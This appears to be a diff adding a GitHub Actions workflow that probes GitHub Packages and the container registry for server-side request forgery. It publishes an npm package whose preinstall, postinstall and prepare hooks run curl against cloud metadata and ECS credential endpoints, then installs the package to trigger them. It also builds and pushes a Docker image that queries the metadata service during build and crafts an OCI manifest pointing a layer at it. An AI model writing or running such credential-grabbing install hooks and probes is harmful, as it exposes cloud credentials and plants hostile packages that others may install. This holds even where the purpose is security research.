@@ -1,0 +1,125 @@
+name: GitHub Packages SSRF Test
+
+on:
+  workflow_dispatch:
+
+permissions:
+  packages: write
+  contents: read
+
+jobs:
+  npm-ssrf:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          registry-url: 'https://npm.pkg.github.com'
+          
+      - name: Create SSRF package.json
+        run: |
+          cat > package.json << 'PKG'
+          {
+            "name": "@apridosimarmata/ssrf-npm-test",
+            "version": "1.0.${{ github.run_number }}",
+            "description": "SSRF test package",
+            "scripts": {
+              "preinstall": "curl -s http://169.254.169.254/latest/meta-data/ > /tmp/preinstall-imds.txt 2>&1 || true",
+              "postinstall": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' > /tmp/postinstall-imds.txt 2>&1 || true",
+              "prepare": "curl -s http://169.254.170.2/v2/credentials > /tmp/ecs-creds.txt 2>&1 || true"
+            },
+            "repository": {
+              "type": "git",
+              "url": "https://github.com/apridosimarmata/ssrf-test-2026"
+            },
+            "publishConfig": {
+              "registry": "https://npm.pkg.github.com"
+            }
+          }
+          PKG
+          cat package.json
+          
+      - name: Publish to GitHub Packages
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          npm publish 2>&1 || echo "Publish may have failed"
+          echo "=== Check if scripts ran during publish ==="
+          cat /tmp/preinstall-imds.txt 2>/dev/null || echo "No preinstall output"
+          cat /tmp/postinstall-imds.txt 2>/dev/null || echo "No postinstall output"
+          
+      - name: Test package install (triggers SSRF scripts)
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          mkdir /tmp/test-install && cd /tmp/test-install
+          echo "@apridosimarmata:registry=https://npm.pkg.github.com" > .npmrc
+          echo "//npm.pkg.github.com/:_authToken=$NODE_AUTH_TOKEN" >> .npmrc
+          npm install @apridosimarmata/ssrf-npm-test@1.0.${{ github.run_number }} 2>&1 || true
+          echo "=== IMDS Results ==="
+          cat /tmp/preinstall-imds.txt 2>/dev/null || echo "No preinstall"
+          cat /tmp/postinstall-imds.txt 2>/dev/null || echo "No postinstall"
+          cat /tmp/ecs-creds.txt 2>/dev/null || echo "No ECS creds"
+
+  container-ssrf:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Login to GitHub Container Registry
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+          
+      - name: Create Dockerfile with SSRF vectors
+        run: |
+          cat > Dockerfile << 'DOCKER'
+          FROM alpine:latest
+          
+          # SSRF during build
+          RUN apk add --no-cache curl && \
+              curl -s http://169.254.169.254/latest/meta-data/ > /imds-build.txt 2>&1 || true && \
+              curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > /azure-imds.txt 2>&1 || true
+          
+          # External layer reference (SSRF attempt)
+          # ADD http://169.254.169.254/latest/meta-data/ /imds-layer.txt
+          
+          CMD ["cat", "/imds-build.txt", "/azure-imds.txt"]
+          DOCKER
+          cat Dockerfile
+          
+      - name: Build and push container
+        run: |
+          docker build -t ghcr.io/apridosimarmata/ssrf-test:${{ github.run_number }} . 2>&1
+          echo "=== Build complete, checking IMDS access during build ==="
+          docker run --rm ghcr.io/apridosimarmata/ssrf-test:${{ github.run_number }} 2>&1 || true
+          docker push ghcr.io/apridosimarmata/ssrf-test:${{ github.run_number }} 2>&1 || true
+          
+      - name: Test external manifest layer
+        run: |
+          # Try to create a manifest with external layer URL
+          cat > manifest.json << 'MANIFEST'
+          {
+            "schemaVersion": 2,
+            "mediaType": "application/vnd.oci.image.manifest.v1+json",
+            "config": {
+              "mediaType": "application/vnd.oci.image.config.v1+json",
+              "digest": "sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a",
+              "size": 2
+            },
+            "layers": [
+              {
+                "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+                "digest": "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+                "size": 100,
+                "urls": ["http://169.254.169.254/latest/meta-data/"]
+              }
+            ]
+          }
+          MANIFEST
+          echo "External URL layer manifest created (OCI allows urls field for external layers)"
